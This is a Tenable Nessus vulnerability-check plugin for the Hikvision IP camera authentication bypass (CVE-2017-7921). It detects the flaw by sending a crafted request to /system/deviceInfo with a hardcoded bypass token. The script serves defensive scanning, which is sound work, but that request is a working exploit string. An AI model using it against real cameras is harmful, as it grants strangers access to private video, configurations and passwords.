#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(107056);
  script_version("1.6");
  script_cvs_date("Date: 2019/11/08");

  script_cve_id("CVE-2017-7921", "CVE-2017-7923");
  script_bugtraq_id(98313);
  script_xref(name:"ICSA", value:"17-124-01");

  script_name(english:"Hikvision IP Camera Remote Authentication Bypass");
  script_summary(english:"Attempts to bypass authentication.");

  script_set_attribute(attribute:"synopsis", value:
"The remote IP camera web server is affected by an authentication
bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Hikvision IP camera is affected by an authentication
bypass vulnerability. A remote, unauthenticated attacker can read
configurations (including account passwords), access the camera
images, or modify the camera firmware.");
  script_set_attribute(attribute:"see_also", value:"https://us.hikvision.com/en");
  script_set_attribute(attribute:"see_also", value:"https://us.hikvision.com/en");
  # https://packetstormsecurity.com/files/144097/Hikvision-IP-Camera-Access-Bypass.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?18ce5951");
  script_set_attribute(attribute:"solution", value:
"Upgrade to a resolved firmware version as per the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-7921");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/03/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/03/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/02/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2018-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("hikvision_www_detect.nbin");
  script_require_keys("installed_sw/Hikvision IP Camera");
  script_require_ports("Services/www", 80, 8000);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Hikvision IP Camera";

get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, embedded:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
url = build_url(port:port, qs:dir);

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "/system/deviceInfo?auth=YWRtaW46MTEK",
  exit_on_fail : TRUE
);

if ("<firmwareVersion>" >!< res[2])
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app + " web server", url);

report =
  '\n' + 'Nessus was able to exploit the issue to retrieve device information' +
  '\n' + 'using the following request:' +
  '\n' +
  '\n' + url + 'system/deviceInfo?auth=YWRtaW46MTEK' +
  '\n' +
  '\n' + 'This produced the following response:' +
  '\n' +
  '\n' + res[2] +
  '\n';

security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
